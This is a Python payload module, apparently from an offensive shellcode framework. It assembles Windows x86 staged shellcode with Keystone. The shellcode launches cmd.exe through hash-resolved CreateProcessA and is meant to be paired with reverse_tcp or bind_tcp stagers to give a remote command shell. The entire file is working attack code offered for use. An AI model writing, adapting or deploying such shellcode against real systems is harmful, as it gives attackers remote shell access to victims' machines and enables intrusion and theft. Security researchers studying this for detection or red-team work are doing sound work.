
from keystone import *  # code assembler
from payloads.lib.get_api_shellcode import get_api_shellcode

HOST="127.0.0.1"    # Default Host Address
PORT=4444           # Default Port Number
FORMAT="raw"        # Default Format
CURRENT_STAGER="reverse_tcp"    # Default stager

class shell(object):
    def __init__(self) -> None:
        self.name = type(self).__name__
        self.platform = "windows"
        self.arch = "x86"
        self.sctype = "stage"
        self.stagers = []
        if self.sctype.upper() in ["STAGE", "SINGLE"]:
            # Base Service Communication for shellcode
            self.stagers.append("bind_tcp")
            self.stagers.append("reverse_tcp")
            # Add extra Service Communication for shellcode
        self.description = "Execute CMD using CreateProcessA (staged)."
        # Add your extra configuration here
        

    def build_shellcode(self):
        gas = get_api_shellcode()
        gas_sc, cnt = gas.assemble()

        shell='''
                pop ebp
                push 000646D63h                     ;' dmc'
                mov ebx,esp                                      
                push edi
                push edi
                push edi
                xor esi,esi
                push 012h
                pop ecx

            set_esi:
                push esi
                loop set_esi
                mov word ptr[esp+03Ch],0101h        ;
                lea eax,[esp+010h]
                mov byte ptr[eax],044h              ;size of SECURITY_ATTRIBUTES
                push esp                            ;Pointer to PROCESS_INFORMATION
                push eax                            ;Pointer to SECURITY_ATTRIBUTES
                push esi
                push esi
                push esi
                inc esi
                push esi                            ;NEW_CONSOLE
                dec esi
                push esi
                push esi
                push ebx
                push esi
                push 0863FCC79h                     ;hash("kernel32.dll","CreateProcessA")
                call ebp        
                mov eax,esp
                dec esi
                push esi
                inc esi
                push dword ptr[eax]
                push 0601D8708h                     ;hash("kernel32.dll", "WaitForSingleObjec")              
                call ebp
                mov ebx,056A2B5F0h                  ;hash("kernel32.dll", "ExitPropcess")
                push 09DBD95A6h                     ;hash("kernel32.dll","GetVersiona")
                call ebp
                cmp al,6
                jl exit_code
                cmp bl,0E0h
                jnz exit_code
                mov ebx,06F721347h                  ;hash("ntdll.dll", "RtlExitUserThread")
            
            exit_code:
                push 0
                push ebx
                call ebp               
        '''
        shell = shell.split("\n")
        o = []
        for d in shell:
            if len(d) <= 0:
                continue
            s = d.find(";")
            if s < 0:
                s=0
                o.append(d[s:])
            else:
                o.append(d.replace(d[s:], ""))
        shell = "\n".join(o)
        # Assemble        
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        shell_enc, cnt = ks.asm(shell)
        asm = bytes(gas_sc) + bytes(shell_enc)
        cnt = len(asm)
        return bytes(asm), cnt